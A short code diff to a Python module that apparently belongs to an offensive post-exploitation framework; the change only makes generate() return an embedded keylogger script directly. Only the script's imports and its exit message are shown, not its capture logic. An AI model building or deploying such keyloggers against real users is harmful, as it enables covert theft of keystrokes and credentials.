@@ -66,7 +66,7 @@ class Module:
 
     def generate(self, obfuscate=False, obfuscationCommand=""):
 
-        script = """# -*- coding: utf-8 -*-
+        return """# -*- coding: utf-8 -*-
 # inspired from https://github.com/amoffat/pykeylogger
 import sys
 from time import sleep, time, strftime
@@ -785,5 +785,3 @@ run()
 job_message_buffer('[!] Keylogger exited\\n')
 
 """
-
-        return script
